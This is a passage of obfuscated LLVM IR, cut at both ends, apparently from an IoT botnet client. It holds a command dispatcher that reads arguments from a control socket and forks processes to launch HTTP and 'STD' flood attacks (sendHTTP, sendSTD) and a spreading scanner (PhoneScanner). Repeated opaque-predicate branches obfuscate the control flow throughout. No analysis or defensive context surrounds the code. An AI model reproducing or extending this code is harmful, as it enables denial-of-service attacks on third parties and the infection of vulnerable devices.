  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %484

; <label>:484:                                    ; preds = %originalBBpart260, %originalBBpart236
  %485 = load i8**, i8*** %4, align 8
  %486 = getelementptr inbounds i8*, i8** %485, i64 0
  %487 = load i8*, i8** %486, align 8
  %488 = call i32 @strcmp(i8* %487, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.479, i32 0, i32 0)) #10
  %489 = icmp ne i32 %488, 0
  br i1 %489, label %597, label %490

; <label>:490:                                    ; preds = %484
  %491 = load i32, i32* @x.107
  %492 = load i32, i32* @y.108
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %490
  %499 = load i32, i32* %3, align 4
  %500 = icmp slt i32 %499, 6
  %501 = load i32, i32* @x.107
  %502 = load i32, i32* @y.108
  %503 = sub i32 %501, 1
  %504 = mul i32 %501, %503
  %505 = urem i32 %504, 2
  %506 = icmp eq i32 %505, 0
  %507 = icmp slt i32 %502, 10
  %508 = or i1 %506, %507
  br i1 %508, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %500, label %537, label %509

; <label>:509:                                    ; preds = %originalBBpart264
  %510 = load i32, i32* @x.107
  %511 = load i32, i32* @y.108
  %512 = sub i32 %510, 1
  %513 = mul i32 %510, %512
  %514 = urem i32 %513, 2
  %515 = icmp eq i32 %514, 0
  %516 = icmp slt i32 %511, 10
  %517 = or i1 %515, %516
  br i1 %517, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %509
  %518 = load i8**, i8*** %4, align 8
  %519 = getelementptr inbounds i8*, i8** %518, i64 3
  %520 = load i8*, i8** %519, align 8
  %521 = call i32 @atoi(i8* %520) #10
  %522 = icmp slt i32 %521, 1
  %523 = load i32, i32* @x.107
  %524 = load i32, i32* @y.108
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %522, label %537, label %531

; <label>:531:                                    ; preds = %originalBBpart268
  %532 = load i8**, i8*** %4, align 8
  %533 = getelementptr inbounds i8*, i8** %532, i64 5
  %534 = load i8*, i8** %533, align 8
  %535 = call i32 @atoi(i8* %534) #10
  %536 = icmp slt i32 %535, 1
  br i1 %536, label %537, label %538

; <label>:537:                                    ; preds = %531, %originalBBpart268, %originalBBpart264
  br label %1297

; <label>:538:                                    ; preds = %531
  %539 = call i32 @listFork()
  %540 = icmp ne i32 %539, 0
  br i1 %540, label %541, label %542

; <label>:541:                                    ; preds = %538
  br label %1297

; <label>:542:                                    ; preds = %538
  %543 = load i32, i32* @x.107
  %544 = load i32, i32* @y.108
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %542
  %551 = load i32, i32* @mainCommSock, align 4
  %552 = load i8**, i8*** %4, align 8
  %553 = getelementptr inbounds i8*, i8** %552, i64 1
  %554 = load i8*, i8** %553, align 8
  %555 = load i8**, i8*** %4, align 8
  %556 = getelementptr inbounds i8*, i8** %555, i64 2
  %557 = load i8*, i8** %556, align 8
  %558 = load i8**, i8*** %4, align 8
  %559 = getelementptr inbounds i8*, i8** %558, i64 3
  %560 = load i8*, i8** %559, align 8
  %561 = call i32 @atoi(i8* %560) #10
  %562 = load i8**, i8*** %4, align 8
  %563 = getelementptr inbounds i8*, i8** %562, i64 5
  %564 = load i8*, i8** %563, align 8
  %565 = call i32 @atoi(i8* %564) #10
  %566 = call i32 (i32, i8*, ...) @sockprintf(i32 %551, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.480, i32 0, i32 0), i8* %554, i8* %557, i32 %561, i32 %565)
  %567 = load i8**, i8*** %4, align 8
  %568 = getelementptr inbounds i8*, i8** %567, i64 1
  %569 = load i8*, i8** %568, align 8
  %570 = load i8**, i8*** %4, align 8
  %571 = getelementptr inbounds i8*, i8** %570, i64 2
  %572 = load i8*, i8** %571, align 8
  %573 = load i8**, i8*** %4, align 8
  %574 = getelementptr inbounds i8*, i8** %573, i64 3
  %575 = load i8*, i8** %574, align 8
  %576 = call i32 @atoi(i8* %575) #10
  %577 = trunc i32 %576 to i16
  %578 = load i8**, i8*** %4, align 8
  %579 = getelementptr inbounds i8*, i8** %578, i64 4
  %580 = load i8*, i8** %579, align 8
  %581 = load i8**, i8*** %4, align 8
  %582 = getelementptr inbounds i8*, i8** %581, i64 5
  %583 = load i8*, i8** %582, align 8
  %584 = call i32 @atoi(i8* %583) #10
  %585 = load i8**, i8*** %4, align 8
  %586 = getelementptr inbounds i8*, i8** %585, i64 6
  %587 = load i8*, i8** %586, align 8
  %588 = call i32 @atoi(i8* %587) #10
  call void @sendHTTP(i8* %569, i8* %572, i16 zeroext %577, i8* %580, i32 %584, i32 %588)
  call void @exit(i32 0) #14
  %589 = load i32, i32* @x.107
  %590 = load i32, i32* @y.108
  %591 = sub i32 %589, 1
  %592 = mul i32 %589, %591
  %593 = urem i32 %592, 2
  %594 = icmp eq i32 %593, 0
  %595 = icmp slt i32 %590, 10
  %596 = or i1 %594, %595
  br i1 %596, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  unreachable

; <label>:597:                                    ; preds = %484
  %598 = load i8**, i8*** %4, align 8
  %599 = getelementptr inbounds i8*, i8** %598, i64 0
  %600 = load i8*, i8** %599, align 8
  %601 = call i32 @strcmp(i8* %600, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.481, i32 0, i32 0)) #10
  %602 = icmp ne i32 %601, 0
  br i1 %602, label %739, label %603

; <label>:603:                                    ; preds = %597
  %604 = load i32, i32* @x.107
  %605 = load i32, i32* @y.108
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %603
  %612 = load i32, i32* %3, align 4
  %613 = icmp ne i32 %612, 2
  %614 = load i32, i32* @x.107
  %615 = load i32, i32* @y.108
  %616 = sub i32 %614, 1
  %617 = mul i32 %614, %616
  %618 = urem i32 %617, 2
  %619 = icmp eq i32 %618, 0
  %620 = icmp slt i32 %615, 10
  %621 = or i1 %619, %620
  br i1 %621, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %613, label %622, label %623

; <label>:622:                                    ; preds = %originalBBpart276
  br label %1297

; <label>:623:                                    ; preds = %originalBBpart276
  %624 = load i32, i32* @x.107
  %625 = load i32, i32* @y.108
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %623
  %632 = load i8**, i8*** %4, align 8
  %633 = getelementptr inbounds i8*, i8** %632, i64 1
  %634 = load i8*, i8** %633, align 8
  %635 = call i32 @strcmp(i8* %634, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i32 0, i32 0)) #10
  %636 = icmp ne i32 %635, 0
  %637 = load i32, i32* @x.107
  %638 = load i32, i32* @y.108
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %636, label %684, label %645

; <label>:645:                                    ; preds = %originalBBpart280
  %646 = load i32, i32* @Phonepid, align 4
  %647 = icmp eq i32 %646, 0
  br i1 %647, label %648, label %665

; <label>:648:                                    ; preds = %645
  %649 = load i32, i32* @x.107
  %650 = load i32, i32* @y.108
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %648
  %657 = load i32, i32* @x.107
  %658 = load i32, i32* @y.108
  %659 = sub i32 %657, 1
  %660 = mul i32 %657, %659
  %661 = urem i32 %660, 2
  %662 = icmp eq i32 %661, 0
  %663 = icmp slt i32 %658, 10
  %664 = or i1 %662, %663
  br i1 %664, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %1297

; <label>:665:                                    ; preds = %645
  %666 = load i32, i32* @x.107
  %667 = load i32, i32* @y.108
  %668 = sub i32 %666, 1
  %669 = mul i32 %666, %668
  %670 = urem i32 %669, 2
  %671 = icmp eq i32 %670, 0
  %672 = icmp slt i32 %667, 10
  %673 = or i1 %671, %672
  br i1 %673, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %665
  %674 = load i32, i32* @Phonepid, align 4
  %675 = call i32 @kill(i32 %674, i32 9) #5
  store i32 0, i32* @Phonepid, align 4
  %676 = load i32, i32* @x.107
  %677 = load i32, i32* @y.108
  %678 = sub i32 %676, 1
  %679 = mul i32 %676, %678
  %680 = urem i32 %679, 2
  %681 = icmp eq i32 %680, 0
  %682 = icmp slt i32 %677, 10
  %683 = or i1 %681, %682
  br i1 %683, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %684

; <label>:684:                                    ; preds = %originalBBpart288, %originalBBpart280
  %685 = load i8**, i8*** %4, align 8
  %686 = getelementptr inbounds i8*, i8** %685, i64 1
  %687 = load i8*, i8** %686, align 8
  %688 = call i32 @strcmp(i8* %687, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i32 0, i32 0)) #10
  %689 = icmp ne i32 %688, 0
  br i1 %689, label %738, label %690

; <label>:690:                                    ; preds = %684
  %691 = load i32, i32* @Phonepid, align 4
  %692 = icmp ne i32 %691, 0
  br i1 %692, label %693, label %694

; <label>:693:                                    ; preds = %690
  br label %1297

; <label>:694:                                    ; preds = %690
  %695 = call i32 @fork() #5
  store i32 %695, i32* %16, align 4
  %696 = load i32, i32* %16, align 4
  %697 = icmp ugt i32 %696, 0
  br i1 %697, label %698, label %716

; <label>:698:                                    ; preds = %694
  %699 = load i32, i32* @x.107
  %700 = load i32, i32* @y.108
  %701 = sub i32 %699, 1
  %702 = mul i32 %699, %701
  %703 = urem i32 %702, 2
  %704 = icmp eq i32 %703, 0
  %705 = icmp slt i32 %700, 10
  %706 = or i1 %704, %705
  br i1 %706, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %698
  %707 = load i32, i32* %16, align 4
  store i32 %707, i32* @Phonepid, align 4
  %708 = load i32, i32* @x.107
  %709 = load i32, i32* @y.108
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %1297

; <label>:716:                                    ; preds = %694
  %717 = load i32, i32* %16, align 4
  %718 = icmp eq i32 %717, -1
  br i1 %718, label %719, label %720

; <label>:719:                                    ; preds = %716
  br label %1297

; <label>:720:                                    ; preds = %716
  %721 = load i32, i32* @x.107
  %722 = load i32, i32* @y.108
  %723 = sub i32 %721, 1
  %724 = mul i32 %721, %723
  %725 = urem i32 %724, 2
  %726 = icmp eq i32 %725, 0
  %727 = icmp slt i32 %722, 10
  %728 = or i1 %726, %727
  br i1 %728, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %720
  %729 = load i32, i32* @x.107
  %730 = load i32, i32* @y.108
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %737

; <label>:737:                                    ; preds = %originalBBpart296
  call void @PhoneScanner()
  call void @_exit(i32 0) #12
  unreachable

; <label>:738:                                    ; preds = %684
  br label %739

; <label>:739:                                    ; preds = %738, %597
  %740 = load i32, i32* @x.107
  %741 = load i32, i32* @y.108
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %739
  %748 = load i8**, i8*** %4, align 8
  %749 = getelementptr inbounds i8*, i8** %748, i64 0
  %750 = load i8*, i8** %749, align 8
  %751 = call i32 @strcmp(i8* %750, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.482, i32 0, i32 0)) #10
  %752 = icmp ne i32 %751, 0
  %753 = load i32, i32* @x.107
  %754 = load i32, i32* @y.108
  %755 = sub i32 %753, 1
  %756 = mul i32 %753, %755
  %757 = urem i32 %756, 2
  %758 = icmp eq i32 %757, 0
  %759 = icmp slt i32 %754, 10
  %760 = or i1 %758, %759
  br i1 %760, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %752, label %865, label %761

; <label>:761:                                    ; preds = %originalBBpart2100
  %762 = load i32, i32* %3, align 4
  %763 = icmp slt i32 %762, 4
  br i1 %763, label %808, label %764

; <label>:764:                                    ; preds = %761
  %765 = load i32, i32* @x.107
  %766 = load i32, i32* @y.108
  %767 = sub i32 %765, 1
  %768 = mul i32 %765, %767
  %769 = urem i32 %768, 2
  %770 = icmp eq i32 %769, 0
  %771 = icmp slt i32 %766, 10
  %772 = or i1 %770, %771
  br i1 %772, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %764
  %773 = load i8**, i8*** %4, align 8
  %774 = getelementptr inbounds i8*, i8** %773, i64 2
  %775 = load i8*, i8** %774, align 8
  %776 = call i32 @atoi(i8* %775) #10
  %777 = icmp slt i32 %776, 1
  %778 = load i32, i32* @x.107
  %779 = load i32, i32* @y.108
  %780 = sub i32 %778, 1
  %781 = mul i32 %778, %780
  %782 = urem i32 %781, 2
  %783 = icmp eq i32 %782, 0
  %784 = icmp slt i32 %779, 10
  %785 = or i1 %783, %784
  br i1 %785, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %777, label %808, label %786

; <label>:786:                                    ; preds = %originalBBpart2104
  %787 = load i32, i32* @x.107
  %788 = load i32, i32* @y.108
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %786
  %795 = load i8**, i8*** %4, align 8
  %796 = getelementptr inbounds i8*, i8** %795, i64 3
  %797 = load i8*, i8** %796, align 8
  %798 = call i32 @atoi(i8* %797) #10
  %799 = icmp slt i32 %798, 1
  %800 = load i32, i32* @x.107
  %801 = load i32, i32* @y.108
  %802 = sub i32 %800, 1
  %803 = mul i32 %800, %802
  %804 = urem i32 %803, 2
  %805 = icmp eq i32 %804, 0
  %806 = icmp slt i32 %801, 10
  %807 = or i1 %805, %806
  br i1 %807, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %799, label %808, label %825

; <label>:808:                                    ; preds = %originalBBpart2108, %originalBBpart2104, %761
  %809 = load i32, i32* @x.107
  %810 = load i32, i32* @y.108
  %811 = sub i32 %809, 1
  %812 = mul i32 %809, %811
  %813 = urem i32 %812, 2
  %814 = icmp eq i32 %813, 0
  %815 = icmp slt i32 %810, 10
  %816 = or i1 %814, %815
  br i1 %816, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %808
  %817 = load i32, i32* @x.107
  %818 = load i32, i32* @y.108
  %819 = sub i32 %817, 1
  %820 = mul i32 %817, %819
  %821 = urem i32 %820, 2
  %822 = icmp eq i32 %821, 0
  %823 = icmp slt i32 %818, 10
  %824 = or i1 %822, %823
  br i1 %824, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %1297

; <label>:825:                                    ; preds = %originalBBpart2108
  %826 = load i8**, i8*** %4, align 8
  %827 = getelementptr inbounds i8*, i8** %826, i64 1
  %828 = load i8*, i8** %827, align 8
  store i8* %828, i8** %17, align 8
  %829 = load i8**, i8*** %4, align 8
  %830 = getelementptr inbounds i8*, i8** %829, i64 2
  %831 = load i8*, i8** %830, align 8
  %832 = call i32 @atoi(i8* %831) #10
  store i32 %832, i32* %18, align 4
  %833 = load i8**, i8*** %4, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 3
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 @atoi(i8* %835) #10
  store i32 %836, i32* %19, align 4
  %837 = load i8*, i8** %17, align 8
  %838 = call i8* @strstr(i8* %837, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %839 = icmp ne i8* %838, null
  br i1 %839, label %840, label %856

; <label>:840:                                    ; preds = %825
  %841 = load i8*, i8** %17, align 8
  %842 = call i8* @strtok(i8* %841, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %842, i8** %20, align 8
  br label %843

; <label>:843:                                    ; preds = %853, %840
  %844 = load i8*, i8** %20, align 8
  %845 = icmp ne i8* %844, null
  br i1 %845, label %846, label %855

; <label>:846:                                    ; preds = %843
  %847 = call i32 @listFork()
  %848 = icmp ne i32 %847, 0
  br i1 %848, label %853, label %849

; <label>:849:                                    ; preds = %846
  %850 = load i8*, i8** %20, align 8
  %851 = load i32, i32* %18, align 4
  %852 = load i32, i32* %19, align 4
  call void @sendSTD(i8* %850, i32 %851, i32 %852)
  call void @_exit(i32 0) #12
  unreachable

; <label>:853:                                    ; preds = %846
  %854 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %854, i8** %20, align 8
  br label %843

; <label>:855:                                    ; preds = %843
  br label %864

; <label>:856:                                    ; preds = %825
  %857 = call i32 @listFork()
  %858 = icmp ne i32 %857, 0
  br i1 %858, label %859, label %860

; <label>:859:                                    ; preds = %856
  br label %1297

; <label>:860:                                    ; preds = %856
  %861 = load i8*, i8** %17, align 8
  %862 = load i32, i32* %18, align 4
  %863 = load i32, i32* %19, align 4
  call void @sendSTD(i8* %861, i32 %862, i32 %863)
  call void @_exit(i32 0) #12
  unreachable

; <label>:864:                                    ; preds = %855
  br label %865

; <label>:865:                                    ; preds = %864, %originalBBpart2100
  %866 = load i8**, i8*** %4, align 8
  %867 = getelementptr inbounds i8*, i8** %866, i64 0
  %868 = load i8*, i8** %867, align 8
  %869 = call i32 @strcmp(i8* %868, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.483, i32 0, i32 0)) #10
  %870 = icmp ne i32 %869, 0
  br i1 %870, label %1152, label %871

; <label>:871:                                    ; preds = %865
  %872 = load i32, i32* %3, align 4
  %873 = icmp slt i32 %872, 6
  br i1 %873, label %996, label %874

; <label>:874:                                    ; preds = %871
  %875 = load i8**, i8*** %4, align 8
  %876 = getelementptr inbounds i8*, i8** %875, i64 3
  %877 = load i8*, i8** %876, align 8
  %878 = call i32 @atoi(i8* %877) #10
  %879 = icmp eq i32 %878, -1
  br i1 %879, label %996, label %880

; <label>:880:                                    ; preds = %874
  %881 = load i32, i32* @x.107
  %882 = load i32, i32* @y.108
  %883 = sub i32 %881, 1
  %884 = mul i32 %881, %883
  %885 = urem i32 %884, 2
  %886 = icmp eq i32 %885, 0
  %887 = icmp slt i32 %882, 10
  %888 = or i1 %886, %887
  br i1 %888, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %880
  %889 = load i8**, i8*** %4, align 8
  %890 = getelementptr inbounds i8*, i8** %889, i64 2
  %891 = load i8*, i8** %890, align 8
  %892 = call i32 @atoi(i8* %891) #10
  %893 = icmp eq i32 %892, -1
  %894 = load i32, i32* @x.107
  %895 = load i32, i32* @y.108
  %896 = sub i32 %894, 1
  %897 = mul i32 %894, %896
  %898 = urem i32 %897, 2
  %899 = icmp eq i32 %898, 0
  %900 = icmp slt i32 %895, 10
  %901 = or i1 %899, %900
  br i1 %901, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %893, label %996, label %902

; <label>:902:                                    ; preds = %originalBBpart2116
  %903 = load i8**, i8*** %4, align 8
  %904 = getelementptr inbounds i8*, i8** %903, i64 4
  %905 = load i8*, i8** %904, align 8
  %906 = call i32 @atoi(i8* %905) #10
  %907 = icmp eq i32 %906, -1
  br i1 %907, label %996, label %908

; <label>:908:                                    ; preds = %902
  %909 = load i8**, i8*** %4, align 8
  %910 = getelementptr inbounds i8*, i8** %909, i64 4
  %911 = load i8*, i8** %910, align 8
  %912 = call i32 @atoi(i8* %911) #10
  %913 = icmp sgt i32 %912, 32
  br i1 %913, label %996, label %914

; <label>:914:                                    ; preds = %908
  %915 = load i32, i32* @x.107
  %916 = load i32, i32* @y.108
  %917 = sub i32 %915, 1
  %918 = mul i32 %915, %917
  %919 = urem i32 %918, 2
  %920 = icmp eq i32 %919, 0
  %921 = icmp slt i32 %916, 10
  %922 = or i1 %920, %921
  br i1 %922, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %914
  %923 = load i32, i32* %3, align 4
  %924 = icmp sgt i32 %923, 6
  %925 = load i32, i32* @x.107
  %926 = load i32, i32* @y.108
  %927 = sub i32 %925, 1
  %928 = mul i32 %925, %927
  %929 = urem i32 %928, 2
  %930 = icmp eq i32 %929, 0
  %931 = icmp slt i32 %926, 10
  %932 = or i1 %930, %931
  br i1 %932, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %924, label %933, label %955

; <label>:933:                                    ; preds = %originalBBpart2120
  %934 = load i32, i32* @x.107
  %935 = load i32, i32* @y.108
  %936 = sub i32 %934, 1
  %937 = mul i32 %934, %936
  %938 = urem i32 %937, 2
  %939 = icmp eq i32 %938, 0
  %940 = icmp slt i32 %935, 10
  %941 = or i1 %939, %940
  br i1 %941, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %933
  %942 = load i8**, i8*** %4, align 8
  %943 = getelementptr inbounds i8*, i8** %942, i64 6
  %944 = load i8*, i8** %943, align 8
  %945 = call i32 @atoi(i8* %944) #10
  %946 = icmp slt i32 %945, 0
  %947 = load i32, i32* @x.107
  %948 = load i32, i32* @y.108
  %949 = sub i32 %947, 1
  %950 = mul i32 %947, %949
  %951 = urem i32 %950, 2
  %952 = icmp eq i32 %951, 0
  %953 = icmp slt i32 %948, 10
  %954 = or i1 %952, %953
  br i1 %954, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %946, label %996, label %955

; <label>:955:                                    ; preds = %originalBBpart2124, %originalBBpart2120
  %956 = load i32, i32* @x.107
  %957 = load i32, i32* @y.108
  %958 = sub i32 %956, 1
  %959 = mul i32 %956, %958
  %960 = urem i32 %959, 2
  %961 = icmp eq i32 %960, 0
  %962 = icmp slt i32 %957, 10
  %963 = or i1 %961, %962
  br i1 %963, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %955
  %964 = load i32, i32* %3, align 4
  %965 = icmp eq i32 %964, 8
  %966 = load i32, i32* @x.107
  %967 = load i32, i32* @y.108
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %965, label %974, label %997

; <label>:974:                                    ; preds = %originalBBpart2128
  %975 = load i32, i32* @x.107
  %976 = load i32, i32* @y.108
  %977 = sub i32 %975, 1
  %978 = mul i32 %975, %977
  %979 = urem i32 %978, 2
  %980 = icmp eq i32 %979, 0
  %981 = icmp slt i32 %976, 10
  %982 = or i1 %980, %981
  br i1 %982, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %974
  %983 = load i8**, i8*** %4, align 8
  %984 = getelementptr inbounds i8*, i8** %983, i64 7
  %985 = load i8*, i8** %984, align 8
  %986 = call i32 @atoi(i8* %985) #10
  %987 = icmp slt i32 %986, 1
  %988 = load i32, i32* @x.107
  %989 = load i32, i32* @y.108
  %990 = sub i32 %988, 1
  %991 = mul i32 %988, %990
  %992 = urem i32 %991, 2
  %993 = icmp eq i32 %992, 0
  %994 = icmp slt i32 %989, 10
  %995 = or i1 %993, %994
  br i1 %995, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %987, label %996, label %997

; <label>:996:                                    ; preds = %originalBBpart2132, %originalBBpart2124, %908, %902, %originalBBpart2116, %874, %871
  br label %1297

; <label>:997:                                    ; preds = %originalBBpart2132, %originalBBpart2128
  %998 = load i32, i32* @x.107
  %999 = load i32, i32* @y.108
  %1000 = sub i32 %998, 1
  %1001 = mul i32 %998, %1000
  %1002 = urem i32 %1001, 2
  %1003 = icmp eq i32 %1002, 0
  %1004 = icmp slt i32 %999, 10
  %1005 = or i1 %1003, %1004
  br i1 %1005, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %997
  %1006 = load i8**, i8*** %4, align 8
  %1007 = getelementptr inbounds i8*, i8** %1006, i64 1
  %1008 = load i8*, i8** %1007, align 8
  store i8* %1008, i8** %21, align 8
  %1009 = load i8**, i8*** %4, align 8
  %1010 = getelementptr inbounds i8*, i8** %1009, i64 2
  %1011 = load i8*, i8** %1010, align 8
  %1012 = call i32 @atoi(i8* %1011) #10
  store i32 %1012, i32* %22, align 4
  %1013 = load i8**, i8*** %4, align 8
  %1014 = getelementptr inbounds i8*, i8** %1013, i64 3
  %1015 = load i8*, i8** %1014, align 8
  %1016 = call i32 @atoi(i8* %1015) #10
  store i32 %1016, i32* %23, align 4
  %1017 = load i8**, i8*** %4, align 8
  %1018 = getelementptr inbounds i8*, i8** %1017, i64 4
  %1019 = load i8*, i8** %1018, align 8
  %1020 = call i32 @atoi(i8* %1019) #10
  store i32 %1020, i32* %24, align 4
  %1021 = load i8**, i8*** %4, align 8
  %1022 = getelementptr inbounds i8*, i8** %1021, i64 5
  %1023 = load i8*, i8** %1022, align 8
  store i8* %1023, i8** %25, align 8
  %1024 = load i32, i32* %3, align 4
  %1025 = icmp eq i32 %1024, 8
  %1026 = load i32, i32* @x.107
  %1027 = load i32, i32* @y.108
  %1028 = sub i32 %1026, 1
  %1029 = mul i32 %1026, %1028
  %1030 = urem i32 %1029, 2
  %1031 = icmp eq i32 %1030, 0
  %1032 = icmp slt i32 %1027, 10
  %1033 = or i1 %1031, %1032
  br i1 %1033, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1025, label %1034, label %1055

; <label>:1034:                                   ; preds = %originalBBpart2136
  %1035 = load i32, i32* @x.107
  %1036 = load i32, i32* @y.108
  %1037 = sub i32 %1035, 1
  %1038 = mul i32 %1035, %1037
  %1039 = urem i32 %1038, 2
  %1040 = icmp eq i32 %1039, 0
  %1041 = icmp slt i32 %1036, 10
  %1042 = or i1 %1040, %1041
  br i1 %1042, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1034
  %1043 = load i8**, i8*** %4, align 8
  %1044 = getelementptr inbounds i8*, i8** %1043, i64 7
  %1045 = load i8*, i8** %1044, align 8
  %1046 = call i32 @atoi(i8* %1045) #10
  %1047 = load i32, i32* @x.107
  %1048 = load i32, i32* @y.108
  %1049 = sub i32 %1047, 1
  %1050 = mul i32 %1047, %1049
  %1051 = urem i32 %1050, 2
  %1052 = icmp eq i32 %1051, 0
  %1053 = icmp slt i32 %1048, 10
  %1054 = or i1 %1052, %1053
  br i1 %1054, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
